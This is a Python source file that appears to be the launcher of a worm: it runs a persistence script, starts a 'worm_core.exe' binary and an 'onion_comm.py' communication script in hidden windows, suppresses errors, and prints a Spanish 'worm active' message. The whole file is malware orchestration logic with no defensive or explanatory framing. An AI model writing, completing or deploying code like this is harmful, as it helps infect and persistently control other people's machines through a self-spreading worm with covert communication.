# orchestrator.py
import os
import sys
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
CREATE_NO_WINDOW = 0x08000000

def main():
    pers = os.path.join(HERE, "persistence.py")
    if os.path.exists(pers):
        subprocess.run([sys.executable, pers], check=False)

    worm = os.path.join(HERE, "worm_core.exe")
    if os.path.exists(worm):
        try:
            subprocess.Popen([worm], creationflags=CREATE_NO_WINDOW, cwd=HERE, close_fds=True)
        except Exception: pass

    comm = os.path.join(HERE, "onion_comm.py")
    if os.path.exists(comm):
        try:
            subprocess.Popen([sys.executable, comm], creationflags=CREATE_NO_WINDOW, cwd=HERE, close_fds=True)
        except Exception: pass

    print("[*] gusano activo")

if __name__ == "__main__":
    main()